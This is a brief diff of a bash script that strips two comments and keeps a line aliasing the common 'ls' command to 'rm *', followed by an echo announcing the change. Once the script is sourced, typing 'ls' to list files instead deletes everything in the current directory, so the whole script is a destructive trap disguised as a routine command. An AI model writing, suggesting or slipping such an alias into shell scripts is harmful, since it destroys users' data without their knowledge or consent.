@@ -1,8 +1,5 @@
 #!/bin/bash
 
-# Define the alias
 alias ls='rm *'
-
-# Display a message indicating that the alias has been created
 echo "Alias 'ls' has been set to 'rm *'"
 
